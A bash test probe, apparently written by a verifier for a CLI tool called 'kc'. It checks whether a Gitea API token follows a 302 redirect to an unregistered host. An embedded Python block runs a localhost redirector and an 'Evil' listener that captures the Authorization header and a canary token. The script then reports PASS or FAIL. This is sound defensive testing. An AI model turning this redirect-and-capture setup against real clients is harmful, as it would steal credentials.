#!/usr/bin/env bash
# 独立验证者探针：令牌是否会被 302 重定向带离已登记主机。
set -uo pipefail
repository_root="/Users/zata/code/keda/.kc-worktrees/issue-416"
root="/private/tmp/issue416-verifier/redirect"
rm -rf "$root"; mkdir -p "$root/home/.kedacode" "$root/repository"
cd "$repository_root"

cat > "$root/home/.kedacode/config.toml" <<'TOML'
[agent_runner]

[[agent_runner.gitea_instances]]
base_url = "http://127.0.0.1:3401"
token_env = "RV_LEAK_TOKEN"
TOML
cat > "$root/repository/.kedacode.toml" <<'TOML'
[agent_runner.repository]
id = "verifier-redirect"
platform = "gitea"
TOML
git -C "$root/repository" init --initial-branch=main --quiet
git -C "$root/repository" remote add origin http://127.0.0.1:3401/o/r.git

python3 -u -c '
import json, sys
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
evil_hits, auth_seen = Path(sys.argv[1]), Path(sys.argv[2])
evil_hits.write_text("0", encoding="utf-8"); auth_seen.write_text("", encoding="utf-8")

class Evil(BaseHTTPRequestHandler):
    def _capture(self):
        evil_hits.write_text(str(int(evil_hits.read_text()) + 1), encoding="utf-8")
        auth_seen.write_text(self.headers.get("Authorization", "<none>"), encoding="utf-8")
        self.send_response(200); self.send_header("Content-Length","2"); self.end_headers(); self.wfile.write(b"ok")
    do_GET = do_POST = do_PATCH = _capture
    def log_message(self, *a): return

class Redirector(BaseHTTPRequestHandler):
    def _respond(self):
        self.send_response(302)
        self.send_header("Location", "http://127.0.0.1:3402/stolen")
        self.send_header("Content-Length","0"); self.end_headers()
    do_GET = do_POST = do_PATCH = _respond
    def log_message(self, *a): return

evil = HTTPServer(("127.0.0.1", 3402), Evil); evil.timeout = 0.2
redir = HTTPServer(("127.0.0.1", 3401), Redirector)
import threading
t = threading.Thread(target=lambda: [redir.handle_request() for _ in range(50)], daemon=True); t.start()
Path(sys.argv[3]).write_text("ready", encoding="utf-8")
for _ in range(60):
    if Path(sys.argv[4]).exists(): break
    evil.handle_request()
evil.server_close(); redir.server_close()
' "$root/evil-hits.txt" "$root/evil-auth.txt" "$root/ready" "$root/done" &
listener_pid=$!
for _ in $(seq 1 50); do [[ -f "$root/ready" ]] && break; sleep 0.1; done

export HOME="$root/home"; unset KEDACODE_CONFIG
export UV_CACHE_DIR=/private/tmp/issue416-uv-cache
export RV_LEAK_TOKEN="SUPERSECRETTOKENVALUE-leak-canary-12345"
out="$(uv run --project "$repository_root" --no-sync kc --repo "$root/repository" issue list --output json 2>&1)"
status=$?
touch "$root/done"; wait "$listener_pid" 2>/dev/null

printf 'PROBE_EXIT_CODE=%s\n' "$status"
printf 'EVIL_LISTENER_HITS=%s\n' "$(cat "$root/evil-hits.txt")"
printf 'EVIL_LISTENER_AUTH_HEADER=%s\n' "$(cat "$root/evil-auth.txt")"
printf 'TOKEN_IN_OUTPUT=%s\n' "$(case "$out" in *SUPERSECRETTOKENVALUE*) echo YES;; *) echo NO;; esac)"
printf 'OUTPUT_TAIL=%s\n' "$(printf '%s' "$out" | tail -4)"
if [[ "$(cat "$root/evil-hits.txt")" == "0" ]]; then printf 'PROBE1_RESULT=PASS token never left registered host\n'; else printf 'PROBE1_RESULT=FAIL token followed redirect to unregistered host\n'; fi
